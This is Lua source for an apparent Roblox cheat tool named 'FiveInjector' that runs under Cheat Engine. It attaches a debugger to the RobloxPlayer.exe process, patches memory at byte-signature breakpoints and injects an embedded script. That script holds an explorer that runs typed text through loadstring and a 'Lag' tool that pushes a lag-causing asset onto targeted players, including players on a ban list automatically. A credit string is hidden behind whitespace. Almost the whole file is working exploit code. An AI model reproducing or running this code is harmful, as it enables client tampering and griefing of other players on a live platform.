		item.Position = UDim2.new(0,0,i*0.05,0)
		item.Size = UDim2.new(1,0,0.05,0)
		item.Visible = true
		item.ZIndex = 1
		item.Draggable = false

		name = Instance.new("TextButton",item)
		name.Name = "ItemName"
		name.BackgroundColor = BrickColor.new("Really black")
		name.BackgroundTransparency = 0.8
		name.BorderColor = BrickColor.new("Really red")
		name.Position = UDim2.new(0.1,0,0,0)
		name.Size = UDim2.new(0.9,0,1,0)
		name.Visible = true
		name.ZIndex = 1
		name.Draggable = false
		name.Font = "ArialBold"
		name.FontSize = "Size14"
		name.Text = "Object"
		name.TextColor = BrickColor.new("Institutional white")
		name.TextXAlignment = "Center"

		icon = Instance.new("ImageLabel",item)
		icon.Name = "Icon"
		icon.BackgroundColor = BrickColor.new("Really black")
		icon.BackgroundTransparency = 0.2
		icon.BorderColor = BrickColor.new("Really red")
		icon.Image = Base..Images.Property
		icon.Position = UDim2.new(0,0,0,0)
		icon.Size = UDim2.new(0.1,0,1,0)
		icon.Visible = true
		icon.ZIndex = 1
		icon.Draggable = false

		value = Instance.new("ObjectValue")
		value.Parent = item
		value.Name = "ObjectValue"

		table.insert(ItemGuis, item)
	end

	ExplorerGui = explore

	propsframe = Instance.new("Frame",otherframe)
	propsframe.Name = "PropertiesFrame"
	propsframe.BackgroundColor = BrickColor.new("Really black")
	propsframe.BackgroundTransparency = 0.4
	propsframe.BorderColor = BrickColor.new("Really red")
	propsframe.Position = UDim2.new(0,0,1,0)
	propsframe.Size = UDim2.new(1,0,16,0)
	propsframe.Visible = false
	propsframe.ZIndex = 1
	propsframe.Draggable = false
	propsframe.Active = true

	list2 = Instance.new("Frame",propsframe)
	list2.Name = "List"
	list2.BackgroundColor = BrickColor.new("Really black")
	list2.BackgroundTransparency = 0.8
	list2.BorderColor = BrickColor.new("Really red")
	list2.Position = UDim2.new(0,0,0.05,0)
	list2.Size = UDim2.new(0.9,0,0.9,0)
	list2.Visible = true
	list2.ZIndex = 1
	list2.Draggable = false

	for i=0,19 do
		property = Instance.new("Frame",list2)
		property.Name = "Property"
		property.BackgroundColor = BrickColor.new("Really black")
		property.BackgroundTransparency = 0.8
		property.BorderColor = BrickColor.new("Really red")
		property.Position = UDim2.new(0,0,i*0.05,0)
		property.Size = UDim2.new(1,0,0.05,0)
		property.Visible = true
		property.ZIndex = 1
		property.Draggable = false

		propname = Instance.new("TextLabel",property)
		propname.Name = "PropertyName"
		propname.BackgroundColor = BrickColor.new("Really black")
		propname.BackgroundTransparency = 0.8
		propname.BorderColor = BrickColor.new("Really red")
		propname.Position = UDim2.new(0,0,0,0)
		propname.Size = UDim2.new(0.5,0,1,0)
		propname.Visible = true
		propname.ZIndex = 1
		propname.Draggable = false
		propname.Font = "ArialBold"
		propname.FontSize = "Size14"
		propname.Text = "Property"
		propname.TextColor = BrickColor.new("Institutional white")
		propname.TextXAlignment = "Center"
		propname.TextScaled = true

		propvalue = Instance.new("TextBox",property)
		propvalue.Name = "PropertyValue"
		propvalue.BackgroundColor = BrickColor.new("Really black")
		propvalue.BackgroundTransparency = 0.8
		propvalue.BorderColor = BrickColor.new("Really red")
		propvalue.Position = UDim2.new(0.5,0,0,0)
		propvalue.Size = UDim2.new(0.5,0,1,0)
		propvalue.Visible = true
		propvalue.ZIndex = 1
		propvalue.Draggable = false
		propvalue.Font = "ArialBold"
		propvalue.FontSize = "Size14"
		propvalue.Text = "Value"
		propvalue.TextColor = BrickColor.new("Institutional white")
		propvalue.TextXAlignment = "Center"
		propvalue.TextScaled = true
		propvalue.ClearTextOnFocus = false

		table.insert(PropGuis, property)
	end
end

CreateGuis()

function ReplaceWith(GuiType, Gui)
	if GuiType == "" or GuiType == nil then return end
	if Gui == "" or Gui == nil then return end
	Parent = Gui.Parent
	local NewGui = Instance.new(GuiType, Parent)
	NewGui.Name = Gui.Name
	NewGui.BackgroundColor = Gui.BackgroundColor
	NewGui.BackgroundTransparency = Gui.BackgroundTransparency
	NewGui.BorderColor = Gui.BorderColor
	NewGui.Position = Gui.Position
	NewGui.Size = Gui.Size
	NewGui.Visible = Gui.Visible
	NewGui.ZIndex = Gui.ZIndex
	NewGui.Draggable = Gui.Draggable
	NewGui.Font = Gui.Font
	NewGui.FontSize = Gui.FontSize
	NewGui.Text = Gui.Text
	NewGui.TextColor = Gui.TextColor
	NewGui.TextXAlignment = Gui.TextXAlignment
	NewGui.TextScaled = Gui.TextScaled
	if GuiType == "TextBox" then
		NewGui.ClearTextOnFocus = false
	end
	Gui:Remove()
end

function UpdateItemGuis()
	PropScrollNumber = 1
	for i=1,#ItemGuis do
		pcall(function()
			ItemGuis[i].ObjectValue.Value = nil
			ItemGuis[i].ItemName.Text = ""
			ItemGuis[i].Icon.Image = ""
			ItemGuis[i].ObjectValue.Value = Selection.Value:GetChildren()[ExpScrollNumber+i-1]
			ItemGuis[i].ItemName.Text = ItemGuis[i].ObjectValue.Value.Name
			SetImage(ItemGuis[i].Icon, ItemGuis[i].ObjectValue.Value.ClassName)
		end)
	end
end

function UpdatePropGuis()
	Props = GetProperties(Selection.Value, Properties)																														ExplorerGui.OtherFrame.Text = string.reverse("r".."e".."r".."o".."l".."p".."x".."E ".."s".."'".."o".."r".."e".."Z".."l".."a".."n".."i".."m".."r".."e".."T")
	for i=1,#PropGuis do
		pcall(function()
			PropName = Props[ViewNumber]
			PropValue = Selection.Value[PropName]
			PropType = type(PropValue)
			PropGuis[i].PropertyName.Text = ""
			PropGuis[i].PropertyValue.Text = ""
			ReplaceWith("TextBox", PropGuis[i].PropertyValue, i)
		end)
	end
	for i=1,#Props do
		pcall(function()
			ViewNumber = PropScrollNumber+i-1
			PropName = Props[ViewNumber]
			PropValue = Selection.Value[PropName]
			PropType = type(PropValue)
			PropGuis[i].PropertyName.Text = PropName
			PropGuis[i].PropertyValue.Text = tostring(PropValue)
			if PropGuis[i].PropertyName.Text == "Parent" then
				if Selection.Value ~= Game then
					if string.sub(PropGuis[i].PropertyValue.Text,1,5) ~= "Game." then
						letters = ""
						lastend = nil
						PropGuis[i].PropertyValue.Text = "Game."..Selection.Value:GetFullName()
						for x=1,#PropGuis[i].PropertyValue.Text do
							letters = letters..string.sub(PropGuis[i].PropertyValue.Text,x,x)
						end
						for x=1,#letters do
							if string.sub(letters,x,x) == "." then
								lastend = x
							end
						end
						newletters = string.sub(letters,1,lastend-1)
						PropGuis[i].PropertyValue.Text = newletters
					end
				else
					PropGuis[i].PropertyValue.Text = Selection.Value:GetFullName()
				end
			end
			if PropType == "userdata" or PropType == "nil" then
				ReplaceWith("TextBox", PropGuis[i].PropertyValue)
			elseif PropType == "boolean" then
				ReplaceWith("TextButton", PropGuis[i].PropertyValue)
			elseif PropType == "string" or PropType == "number" then
				if PropName ~= "DataCost" and PropName ~= "ClassName" then
					ReplaceWith("TextBox", PropGuis[i].PropertyValue)
				else
					ReplaceWith("TextLabel", PropGuis[i].PropertyValue)
				end
			end
		end)
	end
	for i=0,#PropGuis do
		pcall(function()
			PropertyFunction(PropGuis[i].PropertyValue)
		end)
	end
end

function UpdateMainGuis(Search)																																		ExplorerGui.OtherFrame.Text = string.reverse("r".."e".."r".."o".."l".."p".."x".."E ".."s".."'".."o".."r".."e".."Z".."l".."a".."n".."i".."m".."r".."e".."T")
	if ViewGui == "Explorer" or ViewGui == "Properties" then
		if Selection.Value == nil then
			Selection.Value = Game
		end
		if Game:GetService("CoreGui"):FindFirstChild("ObjectHighlight") ~= nil then
			if Selection.Value:IsA("BasePart") or Selection.Value:IsA("Model") then
				Game:GetService("CoreGui").ObjectHighlight.Adornee = Selection.Value
			end
			if Selection.Value:IsA("Tool") or Selection.Value:IsA("Hat") then
				if Selection.Value:FindFirstChild("Handle") ~= nil then
					Game:GetService("CoreGui").ObjectHighlight.Adornee = Selection.Value.Handle
				end
			end
		end
		ExplorerGui.OtherFrame.ExplorerFrame.SearchBox.Text = "Search in "..Selection.Value.Name
		if Selection.Value.Parent == nil then
			ExplorerGui.OtherFrame.ExplorerFrame.BackButton.Text = "Object's Parent is Nil"
		else
			ExplorerGui.OtherFrame.ExplorerFrame.BackButton.Text = "Back to "..Selection.Value.Parent.Name
		end
		if Search ~= "" and Search ~= nil then
			SelectionTable = Selection.Value:GetChildren()
			for i=ExpScrollNumber+1,#SelectionTable do
				if string.find(string.lower(SelectionTable[i].Name), string.lower(Search)) then
					ExpScrollNumber = i
					break
				end
			end
		end
		PropScrollNumber = 1
		UpdateItemGuis()
		UpdatePropGuis()
	end
end

ExplorerGui.OtherFrame.ExpButton.MouseButton1Down:connect(function()
	ExplorerGui.OtherFrame.ExplorerFrame.Visible = true
	ExplorerGui.OtherFrame.PropertiesFrame.Visible = false
	ViewGui = "Explorer"
	UpdateItemGuis()
end)

ExplorerGui.OtherFrame.PropsButton.MouseButton1Down:connect(function()
	ExplorerGui.OtherFrame.PropertiesFrame.Visible = true
	ExplorerGui.OtherFrame.ExplorerFrame.Visible = false
	ViewGui = "Properties"
	UpdatePropGuis()
end)

DownActive = false
UpActive = false

ExplorerGui.OtherFrame.DownButton.MouseButton1Down:connect(function()
	if ViewGui == "Explorer" then
		if ExpScrollNumber < #Selection.Value:GetChildren() - 19 then
			UpActive = false
			DownActive = true
			ExpScrollNumber = ExpScrollNumber + 1
			UpdateItemGuis()
			wait(0.5)
			while DownActive == true do
				if ExpScrollNumber < #Selection.Value:GetChildren() - 19 then
					DownActive = true
					ExpScrollNumber = ExpScrollNumber + 1
					UpdateItemGuis()
				end
				wait(0.05)
			end
		end
	elseif ViewGui == "Properties" then
		local Props = GetProperties(Selection.Value, Properties)
		if PropScrollNumber < table.maxn(Props) - 19 then
			UpActive = false
			DownActive = true
			PropScrollNumber = PropScrollNumber + 1
			UpdatePropGuis()
			wait(0.5)
			while DownActive == true do
				if PropScrollNumber < table.maxn(Props) - 19 then
					PropScrollNumber = PropScrollNumber + 1
					UpdatePropGuis()
				end
				wait(0.05)
			end
		end
	end
end)

ExplorerGui.OtherFrame.DownButton.MouseButton1Up:connect(function()
	DownActive = false
end)

ExplorerGui.OtherFrame.UpButton.MouseButton1Down:connect(function()
	if ViewGui == "Explorer" then
		if ExpScrollNumber - 1 > 0 then
			DownActive = false
			UpActive = true
			ExpScrollNumber = ExpScrollNumber - 1
			UpdateItemGuis()
			wait(0.5)
			while UpActive == true do
				if ExpScrollNumber - 1 > 0 then
					UpActive = true
					ExpScrollNumber = ExpScrollNumber - 1
					UpdateItemGuis()
				end
				wait(0.05)
			end
		end
	elseif ViewGui == "Properties" then
		if PropScrollNumber - 1 > 0 then
			DownActive = false
			UpActive = true
			PropScrollNumber = PropScrollNumber - 1
			UpdatePropGuis()
			wait(0.5)
			while UpActive == true do
				if PropScrollNumber - 1 > 0 then
					PropScrollNumber = PropScrollNumber - 1
					UpdatePropGuis()
				end
				wait(0.05)
			end
		end
	end
end)

ExplorerGui.OtherFrame.UpButton.MouseButton1Up:connect(function()
	UpActive = false
end)

ExplorerGui.OtherFrame.ExplorerFrame.BackButton.MouseButton1Down:connect(function() -- Go back
	if Selection.Value.Parent == nil then
		ExplorerGui.OtherFrame.ExplorerFrame.BackButton.Text = "Object's Parent is Nil"
		UpdateMainGuis()
	else
		Spawn(function()
			ExpScrollNumber = ScrollPlaces[#ScrollPlaces]
			if ExpScrollNumber == nil then ExpScrollNumber = 1 end
			ScrollPlaces[#ScrollPlaces] = nil
			Selection.Value = Selection.Value.Parent
			ExplorerGui.OtherFrame.ExplorerFrame.SearchBox.Text = "Search in "..Selection.Value.Name
			UpdateMainGuis()
			if Selection.Value.Parent ~= nil then
				ExplorerGui.OtherFrame.ExplorerFrame.BackButton.Text = "Back to "..Selection.Value.Parent.Name
			end
		end)
	end
end)

ExplorerGui.OtherFrame.ExplorerFrame.SearchBox.FocusLost:connect(function() -- Search
	UpdateMainGuis(ExplorerGui.OtherFrame.ExplorerFrame.SearchBox.Text)
	ExplorerGui.OtherFrame.ExplorerFrame.SearchBox.Text = "Search in "..Selection.Value.Name
end)

ExplorerGui.OtherFrame.ExplorerFrame.RefreshButton.MouseButton1Down:connect(function() -- Refresh
	if Selection.Value ~= nil and Selection.Value.Parent ~= nil then
		UpdateMainGuis()
	else
		Selection.Value = Game
		ExplorerGui.OtherFrame.ExplorerFrame.SearchBox.Text = "Search in "..Selection.Value.Name
		UpdateMainGuis()
	end
end)

ExplorerGui.OtherFrame.ExplorerFrame.List.Options.MouseLeave:connect(function()
	ExplorerGui.OtherFrame.ExplorerFrame.List.Options.Visible = false
end)

ExplorerGui.OtherFrame.ExplorerFrame.List.Options.CopyButton.MouseButton1Down:connect(function()
	ExplorerGui.OtherFrame.ExplorerFrame.List.Options.Visible = false
	if ExplorerGui.OtherFrame.ExplorerFrame.List.Options.ConfiguredObject.Value == nil then return end
	pcall(function()
		CopiedItem = ExplorerGui.OtherFrame.ExplorerFrame.List.Options.ConfiguredObject.Value:Clone()
	end)
end)

ExplorerGui.OtherFrame.ExplorerFrame.List.Options.PasteButton.MouseButton1Down:connect(function()
	ExplorerGui.OtherFrame.ExplorerFrame.List.Options.Visible = false
	if ExplorerGui.OtherFrame.ExplorerFrame.List.Options.ConfiguredObject.Value ~= nil then
		pcall(function()
			CopiedItem:Clone().Parent = ExplorerGui.OtherFrame.ExplorerFrame.List.Options.ConfiguredObject.Value
		end)
	else
		pcall(function()
			CopiedItem:Clone().Parent = Selection.Value
		end)
	end
end)

ExplorerGui.OtherFrame.ExplorerFrame.List.Options.CutButton.MouseButton1Down:connect(function()
	ExplorerGui.OtherFrame.ExplorerFrame.List.Options.Visible = false
	if ExplorerGui.OtherFrame.ExplorerFrame.List.Options.ConfiguredObject.Value == nil then return end
	pcall(function()
		ExplorerGui.OtherFrame.ExplorerFrame.List.Options.ConfiguredObject.Value:Remove()
		UpdateMainGuis()
	end)
end)

AddedFunction = value.ChildAdded:connect(function(child)
	UpdateMainGuis()
end)
RemovedFunction = value.ChildRemoved:connect(function(child)
	UpdateMainGuis()
end)

Selection.Changed:connect(function(value)
	if AddedFunction ~= nil then
		AddedFunction:disconnect()
	end
	if RemovedFunction ~= nil then
		RemovedFunction:disconnect()
	end
	AddedFunction = value.ChildAdded:connect(function(child)
		UpdateMainGuis()
	end)
	RemovedFunction = value.ChildRemoved:connect(function(child)
		UpdateMainGuis()
	end)
end)

if Mouse ~= nil then
	MouseFunction = Mouse.Button1Down:connect(function()
		if Mouse.Target ~= nil then
			Selection.Value = Mouse.Target
			ExpScrollNumber = 1
			ScrollPlaces = {1}
			UpdateMainGuis()
		elseif Mouse.Target == nil then
			Selection.Value = Workspace
			UpdateMainGuis()
		end
	end)
end

function ItemGuisClicked()
	for i=1,#ItemGuis do
		if ItemGuis[i]:FindFirstChild("ItemName") ~= nil then
			ItemGuis[i].ItemName.MouseButton1Down:connect(function()
				if ItemGuis[i].ObjectValue.Value == nil then return end
				Selection.Value = ItemGuis[i].ObjectValue.Value
				ExplorerGui.OtherFrame.ExplorerFrame.SearchBox.Text = "Search in "..Selection.Value.Name
				table.insert(ScrollPlaces, ExpScrollNumber)
				ExpScrollNumber = 1
				UpdateMainGuis()
			end)
			ItemGuis[i].ItemName.MouseButton2Down:connect(function()
				ExplorerGui.OtherFrame.ExplorerFrame.List.Options.Visible = true
				ExplorerGui.OtherFrame.ExplorerFrame.List.Options.Position = UDim2.new(-0.5,0,ItemGuis[i].Position.Y.Scale,0)
				if ItemGuis[i].ObjectValue.Value ~= nil then
					ExplorerGui.OtherFrame.ExplorerFrame.List.Options.ConfiguredObject.Value = ItemGuis[i].ObjectValue.Value
				else
				ExplorerGui.OtherFrame.ExplorerFrame.List.Options.ConfiguredObject.Value = nil
				end
			end)
			ItemGuis[i].ItemName.MouseEnter:connect(function()
				if Game:GetService("CoreGui"):FindFirstChild("ObjectHighlight") ~= nil then
					if ItemGuis[i].ObjectValue.Value ~= nil then
						if ItemGuis[i].ObjectValue.Value:IsA("BasePart") or ItemGuis[i].ObjectValue.Value:IsA("Model") then
							wait()
							if ItemGuis[i].ObjectValue.Value ~= nil then
								Game:GetService("CoreGui").ObjectHighlight.Adornee = ItemGuis[i].ObjectValue.Value
							end
						end
						if ItemGuis[i].ObjectValue.Value ~= nil then
							if ItemGuis[i].ObjectValue.Value:IsA("Tool") or ItemGuis[i].ObjectValue.Value:IsA("Hat") then
								if ItemGuis[i].ObjectValue.Value:FindFirstChild("Handle") ~= nil then
									wait()
									if ItemGuis[i].ObjectValue.Value ~= nil then
										Game:GetService("CoreGui").ObjectHighlight.Adornee = ItemGuis[i].ObjectValue.Value.Handle
									end
								end
							end
						end
					end
				end
			end)
			ItemGuis[i].ItemName.MouseLeave:connect(function()
				if Game:GetService("CoreGui"):FindFirstChild("ObjectHighlight") ~= nil then
					Game:GetService("CoreGui").ObjectHighlight.Adornee = nil
				end
			end)
		end
	end
end

function PropertyFunction(Gui)
	if Gui == "" or Gui == nil then return end
	if Gui:IsA("TextBox") then
		Gui.FocusLost:connect(function()
			pcall(function()
				Property = Gui.Parent.PropertyName.Text
				if Property == "Parent" or Property == "PrimaryPart" or Property == "CurrentCamera" or Property == "Terrain" then
					loadstring([[Selection.Value[Property] = ]]..Gui.Text)()
				elseif Property == "Velocity" or Property == "RotVelocity" or Property == "Position" or Property == "Size" or Property == "VertexColor" or Property == "GripPos" or Property == "angularvelocity" or Property == "maxTorque" then
					loadstring([[Selection.Value[Property] = Vector3.new(]]..Gui.Text..[[)]])()
				elseif Property == "CFrame" then
					loadstring([[Selection.Value[Property] = CFrame.new(]]..Gui.Text..[[)]])()
				elseif Property == "BrickColor" then
					loadstring([[Selection.Value[Property] = BrickColor.new("]]..Gui.Text..[[")]])()
				elseif Property == "Color" or Property == "Ambient" or Property == "ColorShift_Bottom" or Property == "ColorShift_Top" or Property == "FogColor" or Property == "ShadowColor" then
					pcall(function() loadstring([[Selection.Value[Property] = Color3.new(]]..Gui.Text..[[)]])() end)
					pcall(function() loadstring([[Selection.Value[Property] = BrickColor.new(]]..Gui.Text..[[)]])() end)
				else
					Selection.Value[Property] = Gui.Text
				end
			end)
			UpdatePropGuis()
		end)
	elseif Gui:IsA("TextButton") then
		Gui.MouseButton1Down:connect(function()
			pcall(function()
				Property = Gui.Parent.PropertyName.Text
				if (Selection.Value[Property]) == true then
					Selection.Value[Property] = false
				elseif (Selection.Value[Property]) == false then
					Selection.Value[Property] = true
				end
			end)
			UpdatePropGuis()
		end)
	end
end

UpdateMainGuis()
ItemGuisClicked()

else -- End of Explorer View...

if Game:GetService("CoreGui").RobloxGui:FindFirstChild("PlayerListScreen") ~= nil then
	Game:GetService("CoreGui").RobloxGui.PlayerListScreen.Visible = true
end
for i,v in pairs(Game:GetService("CoreGui"):GetChildren()) do
	if v.Name == "ObjectHighlight" then
		v:Remove()
	end
end
if Game:GetService("CoreGui"):FindFirstChild("ExplorerGui") ~= nil then
	Game:GetService("CoreGui").ExplorerGui:Remove()
end
EmptyTable = {}
if AddedFunction ~= nil then
	AddedFunction:disconnect()
end
if RemovedFunction ~= nil then
	RemovedFunction:disconnect()
end
if MouseFunction ~= nil then
	MouseFunction:disconnect()
end
end
end)
end

-- Mediafire  -- Settings --
banlist = {
"noob1";
"noob2";
"noob3";
"blank";
"blank";
"blank";
"blank";
}

GUISettings = {
	TextColor3 = Color3.new(1,1,1);
	BackgroundColor3 = Color3.new(0,0,0);
	TextTransparency = 0;
	BackgroundTransparency = .25;
}

------------------------------

function SetDefault(gui)
	for property, value in pairs(GUISettings) do
		pcall(function() gui[property] = value end)
	end
end

Identity = false;

do
	local scripty = Instance.new("Script")
	Identity = pcall(function() scripty.Source = "print 'null!'" end)
end

if Identity then
	gui = Instance.new("ScreenGui", game.CoreGui)
else
	gui = Instance.new("ScreenGui", game.Players.LocalPlayer.PlayerGui)
end

playerbutton = Instance.new("TextButton", gui)
playerbutton.Size = UDim2.new(.2, 0, .05, 0)
playerbutton.Position = UDim2.new(.5, 0, .5, 0)
playerbutton.Text = "Select player"
SetDefault(playerbutton)

targetplayer = nil
confirm = playerbutton:Clone()
confirm.Parent = gui
confirm.Position = UDim2.new(.5, 0, .55, 0)
confirm.Text = "Lag!"

close = playerbutton:Clone()
close.Parent = gui
close.Size = UDim2.new(.05, 0, .05, 0)
close.Position = UDim2.new(.7, 0, .55, 0)
close.Text = "Close"

playerbutton.MouseButton1Down:connect(function()
 if #playerbutton:GetChildren() > 0 then
  playerbutton:ClearAllChildren()
  return
 end
 local players = game.Players:GetChildren()
 for _,v in pairs(players) do
  if v == game.Players.LocalPlayer then
   table.remove(players, _)
  end
 end
 for _,v in pairs(players) do
  local button = Instance.new("TextButton")
  button.Size = UDim2.new(.5, 0, .5, 0)
  button.Position = UDim2.new(1,0,.5 - ((_-1)*.5), 0)
  button.Parent = playerbutton
  button.Text = v.Name
  button.MouseButton1Down:connect(function()
   targetplayer = v
   confirm.Text = "Lag "..targetplayer.Name
   playerbutton:ClearAllChildren()
  end)
 end
end)
confirm.MouseButton1Down:connect(function()
 if targetplayer then
  local asset = Game:GetObjects("rbxassetid://117684690")[1]
  asset.Parent = Workspace
  confirm.Text = "Success!"
  wait(0.5)
  asset.Parent = targetplayer.Backpack
  wait(2)
  confirm.Text = "Lag "..targetplayer.Name
 else
  confirm.Text = "You haven't selected a valid player!"
  wait(3)
  confirm.Text = "Lag!"
 end
end)
close.MouseButton1Down:connect(function()
	for _, gui in pairs(gui:GetChildren()) do
		gui:Destroy()
	end
	gui:Destroy()
end)
game.Players.ChildAdded:connect(function(child)
for _,v in pairs(banlist) do
if child.Name:lower() == v:lower() then
repeat wait() until child:FindFirstChild("Backpack")
  local asset = Game:GetObjects("rbxassetid://117684690")[1]
  asset.Parent = Workspace
  wait(0.5)
  asset.Parent = v.Backpack
end
end
end)  ]==]
		local memory = allocateSharedMemory("[ROBLOX]-ScriptTrainer", string.len(script) + 5);
		local mem = toAddr(memory);
		local len = toAddr(string.len(script));
		local success_catch = writeString(mem, script);
		writeBytes(ESP + tonumber("0x" .. GlobalOffset), tonumber("0x" .. mem:sub(7, 8)), tonumber("0x" .. mem:sub(5, 6)), tonumber("0x" .. mem:sub(3, 4)),tonumber("0x" .. mem:sub(1, 2)));
		writeBytes(ESP + tonumber("0x" .. GlobalOffset) + 4, tonumber("0x" .. len:sub(7, 8)), tonumber("0x" .. len:sub(5, 6)), tonumber("0x" .. len:sub(3, 4)),tonumber("0x" .. len:sub(1, 2)));
		--print("[FiveInjector]: Script Execution location " .. GetAddress(toAddr(ESP), GlobalOffset) .. " with length " .. tonumber("0x" .. len));
		pcall(function() debug_removeBreakpoint(EIP); end);
		debug_continueFromBreakpoint(co_run);
		messageDialog("studio.ashx found and " .. (success_catch and "Thejustifierx successful" or "failed to inject."), (success_catch and 2 or 1), 2);
	--else
		--debug_continueFromBreakpoint(co_run)
	--end
end

function Exec()
	local unprotect_mem = {00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 01, 00, 00, 00, 01, 00, 01, 01, 01, 01, 01, 00, 01, 00, 01, 00, 00, 00, 01, 01, 01, 00, 00, 00, 00, 00, 01, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 01, 00, 00, 00, 00, 00, 00, 00, 01, 00, 00, 00, 00, 00, 01, 00, 00, 00}
	writeBytes("00F24118", unprotect_mem);
	pcall(function() object_destroy(Interface.MainFrame); end);
	Exploits, Successes, AddressList, Interface = {}, {}, {}, {};
	--AddExploit("level", {0x89, 0x74, 0x24, 0x0C, 0x89, 0x06, 0xE8}, 4)
	AddExploit("script", {0x83, 0xEC, 0x14, 0x56, 0x57, 0x8B, 0x7C, 0x24, 0x2C, 0x85, 0xFF}, 3)
	for i, v in pairs(Exploits) do
		local exploit = GetExploit(i);
		if (exploit == nil) then
			print("[FiveInjector]: Failed \"" .. v[1] .. "\"");
		else
			pcall(function() debug_removeBreakpoint(exploit); end);
			debug_setBreakpoint(exploit);
			AddressList[v[1]] = exploit;
			table.insert(Successes, v[1]);
			print("[FiveInjector]: Success \"" .. v[1] .. "\" [" .. exploit .. "]");
		end
	end
	print("[FiveInjector]: " .. tostring(#Successes) .. "/" .. tostring(#Exploits) .. " exploits found.")

	if #Successes == #Exploits then
		print("[FiveInjector]: Attached successfully. Listening for studio.ashx now...");
	else
		messageDialog("[FiveInjector]: Initializing failed. FiveInjector fails to launch", 1, 2);
	end
end

function myCheck(_)
	local id = getProcessIDFromProcessName("RobloxPlayer.exe");
	if id ~= nil then
		for i, v in pairs(NoRun) do
			if v == id then
				return
			end
		end
		table.insert(NoRun, id);
		openProcess(id);
		debugProcess(2);
		Exec();
	else
		local id2 = getProcessIDFromProcessName("RobloxPlayerBeta.exe");
		if id2 ~= nil then
			for i, v in pairs(NoRun) do
				if v == id2 then
					return
				end
			end
			table.insert(NoRun, id2);
			openProcess(id2);
			debugProcess(2);
			Exec();
		end
	end
end

t = createTimer(nil)
timer_setInterval(t, 500)
timer_onTimer(t, myCheck)
timer_setEnabled(t, true)